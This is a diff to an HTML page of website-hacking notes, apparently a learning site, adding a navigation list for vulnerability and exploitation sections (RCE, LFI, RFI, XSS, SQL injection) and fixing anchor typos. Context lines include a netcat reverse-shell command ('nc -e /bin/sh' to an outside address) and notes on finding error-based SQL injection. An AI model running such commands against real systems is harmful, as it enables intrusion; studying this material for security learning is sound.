@@ -16,6 +16,27 @@
 
 <h1 style="text-align: center;font-size:60px;">Website Hacking</h1>
 
+<div class="section-list">
+  <h2>Section List:</h2>
+  <ul>
+    <h3>Vulnerabilities</h3>
+
+    <li><a href="#auth-bypass-vuln">Authentication Bypass</a></li>
+    <li><a href="#rce-vuln">RCE</a></li>
+    <li><a href="#lfi-vuln">LFI</a></li>
+    <li><a href="#rfi-vuln">RFI</a></li>
+    <li><a href="#xss-vuln">XSS</a></li>
+    <li><a href="#sql-injection-vuln">SQL Injection</a></li>
+    <h3>Exploitation</h3>
+    <li><a href="#rce-exploit">RCE</a></li>
+    <li><a href="#lfi-exploit">LFI</a></li>
+    <li><a href="#rfi-exploit">RFI</a></li>
+    <li><a href="#xss-exploit">XSS</a></li>
+    <li><a href="#sql-injection-exploit">SQL Injection</a></li>
+
+  </ul>
+</div>
+
               <!--  information gathering section start from here    -->
 
 <br><br><h1 style="text-align: center;text-decoration: underline;">Information Gathering</h1>
@@ -197,7 +218,7 @@
 
     <div id="sql-injection-vuln">
     <h2><li>SQL Injection</li></h2>
-    <a href="#sqi-injection-exploit">[jump to exploit]</a><br><br>
+    <a href="#sql-injection-exploit">[jump to exploit]</a><br><br>
     <h3>Error Based</h3>
     <p>The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).
 
@@ -314,7 +335,7 @@ nc -e /bin/sh 10.20.14 8080<br>
     </P>
     </div>
 
-    <div id="sqi-injection-exploit">
+    <div id="sql-injection-exploit">
     <h2><li>SQL Injection exploitation</li></h2>
     <a href="#sql-injection-vuln">[jump to vulnerability]</a><br><br>
     <p><ol>Some simple SQL command: <ol>1. database()  -- To see database name.</ol>
